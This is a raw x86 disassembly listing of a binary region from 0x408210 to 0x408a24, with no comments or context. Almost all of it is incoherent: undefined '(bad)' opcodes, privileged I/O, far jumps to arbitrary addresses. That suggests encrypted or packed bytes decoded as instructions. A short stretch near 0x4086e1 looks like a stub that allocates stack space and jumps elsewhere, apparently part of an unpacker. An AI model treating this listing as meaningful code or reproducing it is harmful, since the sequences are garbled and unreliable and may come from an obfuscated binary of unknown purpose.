  408210:	adc    DWORD PTR [ecx-0x48],esp
  408213:	test   ah,ah
  408215:	mov    ebp,0xa13ed95e
  40821a:	sub    eax,0xe05481c4
  40821f:	dec    edi
  408220:	cmp    BYTE PTR [ecx+0x14bcf35f],0x79
  408227:	mov    cs,WORD PTR [ebp+eax*1-0x20]
  40822b:	and    cl,BYTE PTR [eax-0x23266ffe]
  408231:	dec    ecx
  408232:	cdq    
  408233:	push   eax
  408234:	xor    BYTE PTR [edi+0x66b6e4e2],bh
  40823a:	data16 add cl,BYTE PTR ds:0x9da88074
  408241:	jp     0x4081f2
  408243:	mov    dl,0xfb
  408245:	or     al,0x46
  408247:	cmc    
  408248:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408249:	cmp    DWORD PTR [ecx-0x539a396d],esp
  40824f:	ss mov eax,esp
  408252:	and    BYTE PTR [edi+edi*4-0x3e],cl
  408256:	xor    bh,BYTE PTR [eax-0x1a4c0c02]
  40825c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40825d:	mov    ds:0x9cd68397,al
  408262:	lock and al,0x2c
  408265:	fbld   TBYTE PTR [ebx+0x6d]
  408268:	adc    eax,0x96b46a3c
  40826d:	or     al,0x6c
  40826f:	cmp    BYTE PTR [esi],al
  408271:	lds    ebx,FWORD PTR [edi]
  408273:	and    BYTE PTR [ebp-0x64],bh
  408276:	shl    ebp,cl
  408278:	cmc    
  408279:	rcr    DWORD PTR [esi+0x6b8ad2fa],0xb8
  408280:	jl     0x408260
  408282:	sbb    edx,DWORD PTR [eax+0xd59d2b8]
  408288:	or     ebx,ecx
  40828a:	push   esp
  40828b:	adc    al,0x5b
  40828d:	jo     0x40824b
  40828f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408290:	pop    ebx
  408291:	fs and eax,0x9dc36a74
  408297:	cwde   
  408298:	inc    esp
  408299:	jns    0x4082a6
  40829b:	jno    0x40823d
  40829d:	push   es
  40829e:	pop    ss
  40829f:	xor    eax,0x74615db7
  4082a4:	sbb    eax,0xb8baa2a
  4082a9:	xchg   ecx,eax
  4082aa:	pop    esi
  4082ab:	lock push esi
  4082ad:	cmpnltps xmm0,xmm3
  4082b1:	fstp   QWORD PTR [edx+0x2db595c3]
  4082b7:	cmp    al,0xaa
  4082b9:	fldcw  WORD PTR [eax]
  4082bb:	in     eax,0xf5
  4082bd:	stos   DWORD PTR es:[edi],eax
  4082be:	sbb    DWORD PTR [eax+0x6c],edi
  4082c1:	int3   
  4082c2:	scas   al,BYTE PTR es:[edi]
  4082c3:	cld    
  4082c4:	xchg   ebp,eax
  4082c5:	inc    esp
  4082c6:	je     0x408266
  4082c8:	repnz fisttp WORD PTR [eax-0x3d]
  4082cc:	sbb    al,0xb7
  4082ce:	int3   
  4082cf:	inc    ecx
  4082d0:	(bad)  
  4082d1:	jbe    0x40832f
  4082d3:	cmc    
  4082d4:	mov    ch,0x76
  4082d6:	dec    edx
  4082d7:	(bad)  
  4082d8:	pop    ebx
  4082d9:	push   esi
  4082da:	je     0x4082c6
  4082dc:	cmp    al,0x6
  4082de:	or     BYTE PTR [esi-0x5b05ca63],dh
  4082e4:	adc    eax,0xbe65ef22
  4082e9:	pop    ds
  4082ea:	cmp    ch,BYTE PTR [ebx-0x3782344b]
  4082f0:	inc    edi
  4082f1:	and    esp,esi
  4082f3:	adc    ch,BYTE PTR [edx+0x29e0e7d9]
  4082f9:	mov    DWORD PTR [edi+0x43],edx
  4082fc:	adc    ax,0x96be
  408300:	lea    esp,[eax+0xa]
  408303:	sbb    ebp,DWORD PTR [edi]
  408305:	popf   
  408306:	add    eax,0x4d01dd54
  40830b:	and    bh,BYTE PTR [ebp+0x52699f5]
  408311:	(bad)  
  408312:	and    eax,0xa632af6a
  408317:	xchg   edx,eax
  408318:	cs dec eax
  40831a:	sub    al,0xb3
  40831c:	rcr    BYTE PTR [edi+ebx*4],1
  40831f:	jmp    0x6aca5e6e
  408324:	mov    ah,0x82
  408326:	pop    edi
  408327:	bound  edx,QWORD PTR [edi+0x69ee4dbe]
  40832d:	mov    eax,ds:0x1a1fa4fc
  408332:	push   ecx
  408333:	clc    
  408334:	add    dh,bl
  408336:	jp     0x408318
  408338:	and    DWORD PTR [eax-0x65],0xffffff8c
  40833c:	inc    esp
  40833d:	inc    edi
  40833f:	hlt    
  408340:	ins    DWORD PTR es:[edi],dx
  408341:	xor    cl,BYTE PTR [eax-0x72]
  408344:	mov    ds:0xb925cc9,eax
  408349:	add    eax,0x2feb8413
  40834e:	adc    al,0x45
  408350:	nop
  408351:	pop    esi
  408352:	and    DWORD PTR [ecx],ebx
  408354:	js     0x408380
  408356:	mov    cs:0xb3380f1a,al
  40835c:	shr    ebp,0xdb
  40835f:	jp     0x408399
  408361:	inc    ebp
  408362:	and    dl,BYTE PTR ds:0x399d6efa
  408368:	xor    bl,BYTE PTR [di+0x36ff]
  40836d:	inc    ebx
  40836e:	push   0x351d195e
  408373:	jmp    0x467c:0x6975c0f6
  40837a:	popf   
  40837b:	add    BYTE PTR [edi],cl
  40837d:	xchg   esi,eax
  40837e:	(bad)  
  40837f:	and    eax,0x8d457505
  408384:	mov    ah,0xae
  408386:	push   edi
  408387:	cmp    cl,cl
  408389:	fnsave [ebp+esi*8-0x73]
  40838d:	cs mov eax,0xba77a5e
  408393:	std    
  408394:	jnp    0x408355
  408396:	in     eax,dx
  408397:	sub    ebp,edi
  408399:	sub    BYTE PTR [esp+eiz*4+0x52],bl
  40839d:	jo     0x4083d7
  40839f:	sub    bl,cl
  4083a1:	stc    
  4083a2:	icebp  
  4083a3:	(bad)  
  4083a4:	fnstenv [ebx-0x4d5f595b]
  4083aa:	hlt    
  4083ab:	sbb    BYTE PTR [edi],ah
  4083ad:	js     0x4083c1
  4083af:	xchg   ecx,eax
  4083b0:	adc    al,0xba
  4083b2:	ss ins BYTE PTR es:[edi],dx
  4083b4:	sub    eax,0xb10d2512
  4083b9:	rcr    dh,1
  4083bb:	jb     0x408401
  4083bd:	adc    DWORD PTR [edi],ecx
  4083bf:	rcr    DWORD PTR [esi],1
  4083c1:	or     eax,ebx
  4083c3:	icebp  
  4083c4:	cmp    al,0xab
  4083c6:	dec    ecx
  4083c7:	mov    ah,0xc
  4083c9:	push   ss
  4083ca:	jmp    0x1256:0x2f08bcc1
  4083d1:	ds movs DWORD PTR es:[edi],DWORD PTR es:[esi]
  4083d4:	xlat   BYTE PTR ds:[ebx]
  4083d5:	lock xor al,0xb7
  4083d8:	test   BYTE PTR [edi-0x265212e3],0x34
  4083df:	sub    bl,bl
  4083e1:	push   0xf
  4083e3:	sbb    DWORD PTR [esi+0x2b8320fb],eax
  4083e9:	mov    ch,0x44
  4083eb:	in     al,0xdd
  4083ed:	les    eax,FWORD PTR [eax]
  4083ef:	sbb    ebx,esi
  4083f1:	test   bh,dh
  4083f3:	ds mov eax,0xd659f6dc
  4083f9:	mov    eax,ds:0xcfb1e13d
  4083fe:	push   0x2df02ade
  408403:	(bad)  
  408405:	mov    ebp,0xada30145
  40840a:	leave  
  40840b:	pop    ebp
  40840c:	pop    ebp
  40840d:	lods   al,BYTE PTR ds:[esi]
  40840e:	and    BYTE PTR [eax+0x7882f240],ch
  408414:	jmp    0xab0c3ce3
  408419:	int    0xd2
  40841b:	lods   al,BYTE PTR ds:[esi]
  40841c:	popa   
  40841d:	out    dx,eax
  40841e:	push   0x7b
  408420:	mov    eax,ds:0x8a3c1e36
  408425:	mov    bh,0x62
  408427:	push   esi
  408428:	inc    ecx
  408429:	inc    eax
  40842a:	rol    ecx,cl
  40842c:	rol    BYTE PTR [esi+0x5388eb97],cl
  408432:	mov    dh,0x1c
  408434:	xchg   ecx,eax
  408435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408436:	adc    ebx,esi
  408438:	cmp    eax,0x979e5b7d
  40843d:	jns    0x408467
  40843f:	test   eax,0xa8265633
  408444:	mov    ds:0x30d2b386,eax
  408449:	mov    DWORD PTR [esi+edi*1-0x3d850d83],0x80e3efd9
  408454:	jge    0x40841d
  408456:	test   DWORD PTR [eax+edi*2-0x61],ecx
  40845a:	stos   BYTE PTR es:[edi],al
  40845b:	or     DWORD PTR [edx-0x11],esi
  40845e:	or     al,0x62
  408460:	aas    
  408461:	pop    edx
  408462:	cmp    ecx,ebx
  408464:	inc    edi
  408465:	cli    
  408466:	and    BYTE PTR [edi-0x1d],dh
  408469:	mov    DWORD PTR [eax+0x3b8e9987],esi
  40846f:	cli    
  408470:	push   edi
  408471:	cmp    al,0x1d
  408473:	pop    ecx
  408474:	aaa    
  408475:	sbb    DWORD PTR [edx],edx
  408477:	repz and ch,BYTE PTR [ebx]
  40847a:	or     DWORD PTR [esp+edx*2+0x233ecc5c],esi
  408481:	pop    es
  408482:	ja     0x4084c8
  408484:	ins    DWORD PTR es:[edi],dx
  408485:	fisub  WORD PTR ds:[esp+ebx*8-0x76]
  40848a:	or     cl,al
  40848c:	inc    ecx
  40848d:	jbe    0x408508
  40848f:	jl     0x4084bc
  408491:	pop    es
  408492:	dec    eax
  408493:	push   eax
  408494:	jnp    0x408466
  408496:	pop    ds
  408497:	test   eax,0xce8c94ee
  40849c:	retf   
  40849d:	dec    eax
  40849e:	dec    edx
  40849f:	jnp    0xdd7941f3
  4084a5:	ja     0x408444
  4084a7:	push   ebp
  4084a8:	das    
  4084a9:	push   cs
  4084aa:	loopne 0x4084ec
  4084ac:	and    cl,BYTE PTR [edi+0x22]
  4084af:	shl    esp,cl
  4084b1:	scas   eax,DWORD PTR es:[edi]
  4084b2:	cmp    DWORD PTR [esi],eax
  4084b4:	das    
  4084b5:	int    0x3b
  4084b7:	push   ds
  4084b8:	push   ds
  4084b9:	sub    al,0xfa
  4084bb:	mov    bl,0x49
  4084bd:	and    al,0x7
  4084bf:	pop    es
  4084c0:	lods   eax,DWORD PTR ds:[esi]
  4084c1:	rcr    DWORD PTR [eax-0x6c],0x23
  4084c5:	xor    eax,0x7184808c
  4084ca:	shl    DWORD PTR [ecx],cl
  4084cc:	maxps  xmm6,XMMWORD PTR [eax]
  4084cf:	and    ebp,DWORD PTR [ebp+0x591f9f9c]
  4084d5:	or     eax,0x772a7b9c
  4084da:	aaa    
  4084db:	loop   0x408469
  4084dd:	xor    DWORD PTR [ebx+0x7],edi
  4084e0:	fstp   QWORD PTR [ebx-0x34d69c2e]
  4084e6:	scas   eax,DWORD PTR es:[edi]
  4084e7:	loop   0x4084fb
  4084e9:	sub    DWORD PTR [ebx+0x20],edx
  4084ec:	cmc    
  4084ed:	cmc    
  4084ee:	fwait
  4084ef:	and    ecx,DWORD PTR [esi]
  4084f1:	ss push esi
  4084f3:	imul   BYTE PTR [edi-0x14f7f5f]
  4084f9:	call   0x7d64:0x46336552
  408500:	push   es
  408501:	adc    eax,0x4b18b860
  408506:	aad    0x45
  408508:	popf   
  408509:	ja     0x40850c
  40850b:	jmp    0x96cc:0x91d3e4d8
  408512:	adc    dl,BYTE PTR [eax]
  408514:	push   edi
  408515:	leave  
  408516:	int3   
  408517:	int    0x21
  408519:	or     edi,DWORD PTR [edi-0xa0151b3]
  40851f:	dec    edx
  408520:	lock dec edi
  408522:	imul   esp,DWORD PTR [esi+0x6c],0x554ac4ff
  408529:	mov    fs,ebp
  40852b:	out    dx,al
  40852c:	mov    dh,0xae
  40852e:	mov    edx,0x8284a283
  408533:	data16 (bad) 
  408535:	into   
  408536:	dec    eax
  408537:	push   esi
  408538:	xor    BYTE PTR [esi-0x5b8b9b30],dh
  40853e:	hlt    
  40853f:	pop    esp
  408540:	xor    esi,edx
  408542:	aas    
  408543:	inc    eax
  408544:	xchg   ecx,eax
  408545:	ffreep st(4)
  408547:	mov    cl,0xfc
  408549:	and    DWORD PTR ds:0x2c226a7e,ebx
  40854f:	aad    0x46
  408551:	mov    DWORD PTR [eax],0xea4d5dcf
  408557:	lds    ebp,FWORD PTR [ebp-0x35a75e16]
  40855d:	jge    0x4084f5
  40855f:	pop    ss
  408560:	cmp    dh,BYTE PTR [esi-0x730d2494]
  408566:	adc    DWORD PTR [edi],ebx
  408568:	sbb    dh,BYTE PTR [ebp+0x4]
  40856b:	jnp    0x408587
  40856d:	adc    BYTE PTR [ebx+0x79eeb407],cl
  408573:	cli    
  408574:	cdq    
  408575:	scas   al,BYTE PTR es:[edi]
  408576:	neg    DWORD PTR [ebp-0x3dc73250]
  40857c:	mov    edx,0x308fefca
  408581:	daa    
  408582:	add    BYTE PTR [edi],bh
  408584:	xchg   esi,eax
  408585:	jb     0x4085d6
  408587:	pop    ebp
  408588:	xor    dl,BYTE PTR [ebx]
  40858a:	mov    esp,0x72eba058
  40858f:	dec    eax
  408590:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408591:	xchg   edx,eax
  408592:	cld    
  408593:	sub    ebp,ebp
  408595:	sub    eax,0xe0e55ee6
  40859a:	aas    
  40859b:	in     eax,0x58
  40859d:	xchg   ebx,eax
  40859e:	xchg   edi,eax
  40859f:	daa    
  4085a0:	jg     0x4085d6
  4085a2:	hlt    
  4085a3:	lea    eax,[esi+0x194f4222]
  4085a9:	out    0xf7,al
  4085ab:	lock sahf 
  4085ad:	call   0x58e1a38
  4085b2:	aaa    
  4085b3:	sar    BYTE PTR [ecx+0x22],cl
  4085b6:	push   ebx
  4085b7:	hlt    
  4085b8:	mov    fs,WORD PTR [ebp+0x34]
  4085bb:	pop    ebx
  4085bc:	data16 sub BYTE PTR [ecx-0x4b],0xca
  4085c1:	inc    esi
  4085c2:	fnsave [ebp+ebp*1-0x38]
  4085c6:	inc    esi
  4085c7:	jg     0x4085ef
  4085c9:	iret   
  4085ca:	les    edi,FWORD PTR ds:0x72cc2510
  4085d0:	add    eax,0xa23a18ef
  4085d5:	retf   
  4085d6:	test   dl,bh
  4085d8:	jno    0x4085cb
  4085da:	cld    
  4085db:	(bad)  [ebp+ebp*2-0x54]
  4085df:	mov    ds:0x1f7fe868,al
  4085e4:	push   esp
  4085e5:	call   0x515d8e73
  4085ea:	sbb    al,0x98
  4085ec:	adc    al,BYTE PTR [edi]
  4085ee:	(bad)  
  4085ef:	pop    ebp
  4085f0:	mov    al,ds:0x4c905669
  4085f5:	loop   0x4085eb
  4085f7:	mov    dl,0x86
  4085f9:	jge    0x4085ec
  4085fb:	dec    ebp
  4085fc:	pop    edi
  4085fd:	aas    
  4085fe:	adc    ecx,edx
  408600:	mov    esi,0x5a2f5060
  408605:	fsub   QWORD PTR [ebx]
  408607:	cmp    esp,DWORD PTR [edi]
  408609:	mov    esp,0x5c979eb
  40860e:	adc    BYTE PTR [ecx-0x21d2d55a],dl
  408614:	sub    BYTE PTR [ecx+0x5aa19994],bh
  40861a:	adc    cl,BYTE PTR ds:0x81ff0a85
  408620:	add    BYTE PTR [ebp-0x786a7f8f],dh
  408626:	sbb    eax,0xfd71212
  40862b:	outs   dx,DWORD PTR ds:[esi]
  40862c:	shl    DWORD PTR [ebp+0xcc70e1f],1
  408632:	iret   
  408633:	mov    esp,0x6132031f
  408639:	mov    DWORD PTR [ebp-0x48f9e3c7],ecx
  40863f:	shl    eax,cl
  408641:	jnp    0x408617
  408643:	push   es
  408644:	repz loop 0x408647
  408647:	test   eax,0x93d7d8c6
  40864c:	jae    0x408670
  40864e:	popf   
  40864f:	push   ebx
  408650:	xlat   BYTE PTR ds:[ebx]
  408651:	xor    ch,bh
  408653:	push   0xa1c60066
  408658:	pop    ebx
  408659:	aas    
  40865a:	sub    DWORD PTR ds:0x45d2f540,ebx
  408660:	xchg   esi,eax
  408661:	mov    ds:0x3c9be706,eax
  408666:	out    dx,al
  408667:	je     0x4085ff
  408669:	test   ecx,ecx
  40866b:	into   
  40866c:	cmp    BYTE PTR [edi-0x3a7065e5],0x83
  408673:	pop    esp
  408674:	sbb    ah,bh
  408676:	fcmovbe st,st(1)
  408678:	push   esi
  408679:	xchg   esi,eax
  40867a:	lods   eax,DWORD PTR ds:[esi]
  40867b:	fcomp  QWORD PTR [ecx+ebx*4-0x4edf1358]
  408682:	(bad)  [ebp+0x556e2de]
  408688:	dec    edx
  408689:	jbe    0x4086c2
  40868b:	dec    ebx
  40868c:	mov    edx,0x1fe708f4
  408691:	inc    edi
  408692:	cmp    BYTE PTR [edx+0x504dbc87],0xa
  408699:	popa   
  40869a:	leave  
  40869b:	pop    ss
  40869c:	xor    al,0xe5
  40869e:	mov    ebx,0xbf2445b5
  4086a3:	xchg   edi,eax
  4086a4:	jg     0x4086be
  4086a6:	push   esp
  4086a7:	ins    DWORD PTR es:[edi],dx
  4086a8:	dec    esi
  4086a9:	jle    0x4086ff
  4086ab:	or     al,0x81
  4086ad:	mov    eax,DWORD PTR [edi-0x41]
  4086b0:	aas    
  4086b1:	and    dh,BYTE PTR [ecx+eiz*8]
  4086b4:	inc    ebx
  4086b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086b6:	sbb    al,BYTE PTR [eax-0x70a3337e]
  4086bc:	cmc    
  4086bd:	jae    0x408663
  4086bf:	mov    al,ds:0x21877892
  4086c4:	bound  eax,QWORD PTR [ecx]
  4086c6:	pop    esi
  4086c7:	xchg   ecx,eax
  4086c8:	adc    eax,0xd7247374
  4086cd:	cdq    
  4086ce:	or     eax,0x8f1583cd
  4086d3:	and    esp,DWORD PTR [ebp+0x6adf904f]
  4086d9:	add    esi,DWORD PTR [ebx]
  4086db:	rcr    BYTE PTR [edx-0x7d],cl
  4086de:	ret    0x5208
  4086e1:	pop    ecx
  4086e2:	push   0x6
  4086e4:	dec    ecx
  4086e5:	pop    ebx
  4086e6:	dec    ebx
  4086e7:	xchg   ebx,ecx
  4086e9:	sub    ebx,ecx
  4086eb:	xchg   ebx,ecx
  4086ed:	dec    ecx
  4086ee:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f1:	imul   eax,ecx
  4086f4:	sub    esp,eax
  4086f6:	mov    DWORD PTR [ebp-0x20],esp
  4086f9:	mov    eax,DWORD PTR [ebp-0x4]
  4086fc:	mov    ecx,0x7510893
  408701:	jmp    0x40aa90
  408706:	dec    edi
  408707:	mov    al,0x72
  408709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40870a:	mov    cl,0x64
  40870c:	mov    ds:0xbf3f0e63,eax
  408711:	mov    eax,0x5e600277
  408716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408717:	sbb    BYTE PTR [edx+0x62],ah
  40871a:	adc    BYTE PTR [edi+0x62],bl
  40871d:	(bad)  
  40871e:	(bad)  
  40871f:	clc    
  408720:	jns    0x40877a
  408722:	ins    DWORD PTR es:[edi],dx
  408723:	not    dh
  408725:	jne    0x40877e
  408727:	ror    DWORD PTR ds:0xe2474527,cl
  40872d:	test   eax,0x30991215
  408732:	popa   
  408733:	or     al,0x42
  408735:	jae    0x4087ab
  408737:	ud1    edx,DWORD PTR [ebp+0x47]
  40873b:	leave  
  40873c:	jmp    0x4086d4
  40873e:	dec    edx
  40873f:	dec    edi
  408740:	push   ebx
  408741:	adc    eax,0x8643316f
  408746:	mov    BYTE PTR [eax],cl
  408748:	pop    edx
  408749:	sub    ebx,eax
  40874b:	dec    DWORD PTR [ebx]
  40874d:	mov    dh,0x5b
  40874f:	inc    ecx
  408750:	xchg   ecx,eax
  408751:	mov    cl,0xf0
  408753:	cwde   
  408754:	mov    BYTE PTR [edx],dl
  408756:	mov    DWORD PTR [ecx+ebx*1],eax
  408759:	mov    ch,ch
  40875b:	sub    DWORD PTR [esi+0x4c976a1],ecx
  408761:	mov    al,0x8e
  408763:	and    eax,0xbc870d6d
  408768:	fcmovnbe st,st(2)
  40876a:	mov    bh,0x12
  40876c:	adc    BYTE PTR [edi+esi*2+0x2d],al
  408770:	std    
  408771:	ja     0x4087ac
  408773:	push   edi
  408774:	xor    eax,0x7f98539e
  408779:	loopne 0x40878c
  40877b:	xor    eax,0x395051d0
  408780:	jb     0x40872d
  408782:	aas    
  408783:	and    DWORD PTR [esi+0x64],ebx
  408786:	stos   DWORD PTR es:[edi],eax
  408787:	sbb    eax,0x318f92d2
  40878c:	mov    ecx,0xf84c0971
  408791:	out    0x8d,eax
  408793:	cmovb  ecx,ecx
  408796:	int    0xab
  408798:	fdivr  st(0),st
  40879a:	xchg   ebx,eax
  40879b:	in     al,0x83
  40879d:	test   BYTE PTR [esi-0x12],ah
  4087a0:	pop    ds
  4087a1:	add    esi,ecx
  4087a3:	push   0xc29e3e4f
  4087a8:	jne    0x408804
  4087aa:	jb     0x4087fe
  4087ac:	jns    0x4087cd
  4087ae:	and    BYTE PTR [ecx+0x35],0x11
  4087b2:	imul   esp,DWORD PTR [eax-0x77],0x3c
  4087b6:	(bad)  
  4087b7:	ror    bh,cl
  4087b9:	fwait
  4087ba:	(bad)  
  4087bb:	lahf   
  4087bc:	sub    DWORD PTR [edi+0x7d5a5fca],0x1e
  4087c3:	inc    ecx
  4087c4:	jge    0x40878a
  4087c6:	mov    bl,0xd0
  4087c8:	or     ch,ch
  4087ca:	mov    ah,0xe
  4087cc:	mov    eax,0x2665646b
  4087d1:	in     al,0xa0
  4087d3:	add    DWORD PTR [esp+eiz*4+0x41],0x77
  4087d8:	loope  0x408805
  4087da:	ss xchg edx,eax
  4087dc:	pop    DWORD PTR [eax-0x74]
  4087df:	push   edi
  4087e0:	xchg   BYTE PTR [edx-0xe231ec5],ch
  4087e6:	fwait
  4087e7:	xor    eax,edx
  4087e9:	imul   BYTE PTR [esi+0x69bc285a]
  4087ef:	call   0x8596:0x4ee60214
  4087f6:	add    DWORD PTR [ebp-0x5],esi
  4087f9:	leave  
  4087fa:	sbb    al,0xbe
  4087fc:	or     al,0x8c
  4087fe:	dec    edx
  4087ff:	mov    ecx,0x6f9d7316
  408804:	call   0xd78cb202
  408809:	ja     0x40886e
  40880b:	nop
  40880c:	pop    edi
  40880d:	jl     0x4087e5
  40880f:	out    dx,eax
  408810:	imul   ebx,edi,0x42
  408813:	xor    al,0x1a
  408815:	hlt    
  408816:	push   ecx
  408817:	add    ch,ch
  408819:	push   ecx
  40881a:	fs xchg ecx,eax
  40881c:	adc    cl,BYTE PTR [edi+0x5e]
  40881f:	sahf   
  408820:	jmp    0x132d:0x82564598
  408827:	cli    
  408828:	cs loopne 0x4087ef
  40882b:	retf   
  40882c:	xlat   BYTE PTR ds:[ebx]
  40882d:	mov    ebx,0x63840392
  408832:	shl    BYTE PTR [ecx+0x4a],cl
  408835:	mov    eax,DWORD PTR [edx-0x896e406]
  40883b:	test   eax,0x4683fa53
  408840:	jp     0x408879
  408842:	loope  0x40882f
  408844:	inc    esp
  408845:	dec    esi
  408846:	or     esi,DWORD PTR [eax+ebp*4-0x6c]
  40884a:	pusha  
  40884b:	mov    eax,ds:0x9668355a
  408850:	jg     0x408857
  408852:	jp     0x40880a
  408854:	fnstsw WORD PTR [esi-0x2b]
  408857:	pop    edi
  408858:	adc    DWORD PTR [ebp+0x50],ebx
  40885b:	mov    al,0x64
  40885d:	test   DWORD PTR [edi+ebp*2],0x61f894af
  408864:	in     al,0x82
  408866:	xor    DWORD PTR [ebp+0x76f029],ebx
  40886c:	aad    0x6d
  40886e:	pushf  
  40886f:	mov    ebx,0x94e128a1
  408874:	mov    bh,0xd6
  408876:	and    al,0xb1
  408878:	mov    ds:0xee403f0e,al
  40887d:	pop    ds
  40887e:	jo     0x4088dd
  408880:	or     edi,esi
  408882:	mov    eax,es:0x9fa03148
  408888:	dec    esi
  408889:	inc    ecx
  40888a:	nop
  40888b:	sbb    bl,BYTE PTR [edi]
  40888d:	sti    
  40888e:	and    DWORD PTR [ebx+ebp*4+0x441d15ee],esi
  408895:	inc    edx
  408896:	daa    
  408897:	ins    BYTE PTR es:[edi],dx
  408898:	xor    eax,0x2e953b6e
  40889d:	in     al,0x2e
  40889f:	pushf  
  4088a0:	test   bh,0xd6
  4088a3:	jns    0x4088e0
  4088a5:	clc    
  4088a6:	sub    bh,0x5d
  4088a9:	outs   dx,DWORD PTR ds:[esi]
  4088aa:	pop    ds
  4088ab:	xor    ch,ch
  4088ad:	xor    edi,esp
  4088af:	or     DWORD PTR [esi+edx*2],ebx
  4088b2:	int3   
  4088b3:	mov    eax,0xd098642
  4088b8:	push   ebp
  4088b9:	jge    0x4088a2
  4088bb:	mov    esp,0x969a8449
  4088c0:	imul   ecx,DWORD PTR [edx-0x3c],0x8bbdb126
  4088c7:	dec    esp
  4088c8:	js     0x40893c
  4088ca:	rcl    BYTE PTR [ecx-0x4b],1
  4088cd:	cwde   
  4088ce:	(bad)  
  4088cf:	xchg   esi,eax
  4088d0:	aas    
  4088d1:	xchg   ebp,eax
  4088d2:	neg    cl
  4088d4:	mov    ds:0x7ae7f376,eax
  4088d9:	iret   
  4088da:	mov    esi,0xfe11a508
  4088df:	mov    es,eax
  4088e1:	pop    esi
  4088e2:	inc    ebp
  4088e4:	jno    0x4088b8
  4088e6:	shl    BYTE PTR [edx-0x28639462],0x61
  4088ed:	stos   BYTE PTR es:[edi],al
  4088ee:	xor    DWORD PTR [esi-0x47ec4d0c],ebp
  4088f4:	or     eax,0x73a53926
  4088f9:	sbb    ah,al
  4088fb:	sbb    eax,0xd1f4de87
  408900:	mov    esi,0x94957fcb
  408905:	fistp  QWORD PTR [edi+0x3b3129d3]
  40890b:	mov    bl,0x26
  40890d:	mov    dh,0x40
  40890f:	int3   
  408910:	add    ecx,edi
  408912:	mov    ebp,0x62da91d
  408917:	imul   ebp,DWORD PTR [esi-0x62],0xe315b136
  40891e:	jp     0x408955
  408920:	loope  0x4088dd
  408922:	icebp  
  408923:	sahf   
  408924:	mov    ds:0xfdbe1a7b,al
  408929:	fnstenv [edi]
  40892b:	pop    ds
  40892c:	aad    0x7c
  40892e:	and    esi,DWORD PTR [ecx]
  408930:	mov    BYTE PTR [ecx-0x40ee9aa],bl
  408936:	jle    0x4088c3
  408938:	xor    edx,edx
  40893a:	cmp    eax,0xc0a507f6
  40893f:	ret    
  408940:	dec    eax
  408941:	dec    edi
  408942:	pusha  
  408943:	xchg   edi,eax
  408944:	xchg   ecx,esi
  408946:	sar    DWORD PTR [eax],1
  408948:	aam    0xe2
  40894a:	into   
  40894b:	icebp  
  40894c:	mov    bh,0x6b
  40894e:	sub    esi,0x27cb4726
  408954:	lahf   
  408955:	test   al,0x18
  408957:	ficom  DWORD PTR [eax]
  408959:	clc    
  40895a:	aad    0xc5
  40895c:	or     esp,DWORD PTR [ebp+0x19]
  40895f:	inc    esp
  408960:	std    
  408961:	mov    eax,esi
  408963:	sbb    DWORD PTR [edx],0x58
  408966:	push   ebp
  408967:	bound  eax,QWORD PTR [edi]
  408969:	fidiv  WORD PTR [esi+eiz*2-0x34]
  40896d:	and    BYTE PTR [edi-0x5b7fed16],ch
  408973:	jg     0x408950
  408975:	and    bh,BYTE PTR [edi-0x7c48af42]
  40897b:	sar    ebp,0x95
  40897e:	out    dx,eax
  40897f:	xchg   DWORD PTR [ecx+0x44],edx
  408982:	not    DWORD PTR [esi+0x48e07397]
  408988:	push   ds
  408989:	adc    edx,DWORD PTR [eax-0x609624a8]
  40898f:	leave  
  408990:	mov    dl,0x98
  408992:	sbb    al,0x49
  408994:	mov    edi,0x37d095ff
  408999:	lock pop ecx
  40899b:	adc    ah,dl
  40899d:	jp     0x4089bf
  40899f:	scas   eax,DWORD PTR es:[edi]
  4089a0:	push   edi
  4089a1:	sbb    ebx,DWORD PTR [ecx-0x295a30eb]
  4089a7:	cmp    edi,DWORD PTR [eax+0x7ac27788]
  4089ad:	popf   
  4089ae:	retf   0x52cc
  4089b1:	push   0xc1d3dd73
  4089b6:	jp     0x408972
  4089b8:	pop    esi
  4089b9:	aad    0x55
  4089bb:	mov    eax,ebx
  4089bd:	mov    ebx,DWORD PTR [esi]
  4089bf:	xchg   edi,eax
  4089c0:	and    al,0x81
  4089c2:	clc    
  4089c3:	pop    ebp
  4089c4:	out    dx,eax
  4089c5:	xor    eax,ebx
  4089c7:	sbb    BYTE PTR [ebx-0x52],cl
  4089ca:	imul   ebp,edx,0x61
  4089cd:	sahf   
  4089ce:	popf   
  4089cf:	sbb    al,BYTE PTR [edi]
  4089d1:	into   
  4089d2:	mov    DWORD PTR [esi-0x68],ebx
  4089d5:	cwde   
  4089d6:	or     DWORD PTR [edi-0x4ce7eaed],ebp
  4089dc:	push   edx
  4089dd:	sub    BYTE PTR [esi+0x48],cl
  4089e0:	jb     0x408a13
  4089e2:	sub    dl,cl
  4089e4:	mov    ebp,0x3c7ce93a
  4089e9:	xchg   ebx,eax
  4089ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089eb:	cmp    DWORD PTR [ebx+0x48],ecx
  4089ee:	fwait
  4089ef:	push   ss
  4089f0:	mov    WORD PTR [ebp-0x24],cs
  4089f3:	nop
  4089f4:	in     al,dx
  4089f5:	jb     0x4089b2
  4089f7:	jl     0x4089d4
  4089f9:	shl    bh,1
  4089fb:	(bad)  
  4089fc:	sbb    esi,esp
  4089fe:	mov    ch,0x8f
  408a00:	xchg   esi,eax
  408a01:	push   ebx
  408a02:	add    ecx,eax
  408a04:	retf   0x4e40
  408a07:	or     bl,ch
  408a09:	mov    bh,0xa7
  408a0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a0c:	dec    esp
  408a0d:	gs sub bh,0xb8
  408a11:	popf   
  408a12:	outs   dx,DWORD PTR ds:[esi]
  408a13:	mov    al,0x99
  408a15:	aas    
  408a16:	and    al,0xef
  408a18:	dec    edi
  408a19:	rol    cl,1
  408a1b:	xlat   BYTE PTR ds:[ebx]
  408a1c:	fstp   QWORD PTR [ebp-0x7b343480]
  408a22:	jle    0x4089d0
  408a24:	arpl   WORD PTR [ebx],di
